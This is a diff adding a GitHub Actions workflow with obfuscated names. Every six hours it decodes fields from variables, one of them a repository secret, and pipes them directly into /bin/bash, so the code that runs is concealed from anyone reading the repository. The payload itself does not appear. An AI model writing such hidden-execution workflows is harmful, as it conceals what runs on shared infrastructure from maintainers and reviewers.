@@ -1,0 +1,23 @@
+name: bohaocatan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bohaocatan
+        env:
+          j57: ${{ secrets.j57 }}
+        run: |
+          echo $j57 | jq -r .e8 | /bin/bash
+          echo $jrurv6148 | jq -r .bo00 | /bin/bash
+          echo $b3569 | jq -r .bwpsm6568 | /bin/bash
+          echo $cqgp6 | jq -r .yf91 | /bin/bash
+          echo $c9 | jq -r .pbxy73688 | /bin/bash
+          echo $oz350 | jq -r .i50842 | /bin/bash
+
